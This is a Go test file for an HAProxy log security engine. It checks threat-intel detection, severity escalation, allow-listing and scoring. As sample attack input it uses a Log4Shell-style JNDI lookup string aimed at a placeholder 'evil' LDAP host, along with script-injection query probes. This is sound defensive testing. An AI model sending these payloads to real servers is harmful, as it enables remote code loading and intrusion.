package security

import (
	"testing"
	"time"

	"haproxy-gui/internal/haproxylog"
)

func ctiLine(ip, target string) haproxylog.Line {
	l := line(ip, "GET", target, 200)
	l.Target = target
	return l
}

func TestEngine_ThreatIntel_FiresOnFirstCriticalHit(t *testing.T) {
	e := NewEngine(testThresholds())
	got := e.Ingest([]haproxylog.Line{ctiLine("9.9.9.9", "/?x=${jndi:ldap://evil/a}")}, time.Now())
	if len(got) != 1 || got[0].Rule != RuleThreatIntel {
		t.Fatalf("got %+v, want one threat_intel detection", got)
	}
	if got[0].Severity != SeverityCritical {
		t.Errorf("severity = %q, want critical", got[0].Severity)
	}
	if got[0].Evidence["recommended_action"] != "IMMEDIATE_BLOCK" {
		t.Errorf("recommended_action = %v", got[0].Evidence["recommended_action"])
	}
	if m, _ := got[0].Evidence["mitre"].([]string); len(m) == 0 || m[0] != "T1190" {
		t.Errorf("mitre = %v, want T1190", got[0].Evidence["mitre"])
	}
}

func TestEngine_ThreatIntel_MediumEscalatesToHigh(t *testing.T) {
	thr := testThresholds()
	thr.CTIEscalateHits = 3
	e := NewEngine(thr)
	now := time.Now()

	got := e.Ingest([]haproxylog.Line{ctiLine("9.9.9.9", "/s?q=<script>")}, now)
	if len(got) != 1 || got[0].Severity != SeverityMedium {
		t.Fatalf("first hit: got %+v, want one medium detection", got)
	}
	got = e.Ingest([]haproxylog.Line{ctiLine("9.9.9.9", "/s?q=<script>1"), ctiLine("9.9.9.9", "/s?q=<script>2")}, now)
	if len(got) != 1 || got[0].Severity != SeverityHigh {
		t.Fatalf("after 3 hits: got %+v, want escalation to high", got)
	}
}

func TestEngine_ThreatIntel_BenignAndAllowlistedIgnored(t *testing.T) {
	thr := testThresholds()
	thr.AllowCIDRs = []string{"10.0.0.0/8"}
	e := NewEngine(thr)
	now := time.Now()

	if got := e.Ingest([]haproxylog.Line{ctiLine("9.9.9.9", "/index.html?id=5")}, now); len(got) != 0 {
		t.Fatalf("benign request produced %+v", got)
	}
	if got := e.Ingest([]haproxylog.Line{ctiLine("10.1.1.1", "/?x=${jndi:ldap://evil/a}")}, now); len(got) != 0 {
		t.Fatalf("allow-listed IP produced %+v", got)
	}
}

func TestScore_ThreatIntelOutweighsRateAnomaly(t *testing.T) {
	now := time.Now()
	cti := Score([]Detection{{Rule: RuleThreatIntel, Severity: SeverityHigh, LastSeen: now}}, now)
	rate := Score([]Detection{{Rule: RuleRateAnomaly, Severity: SeverityHigh, LastSeen: now}}, now)
	if cti <= rate {
		t.Errorf("threat_intel score %.1f should exceed rate_anomaly %.1f at equal severity", cti, rate)
	}
}
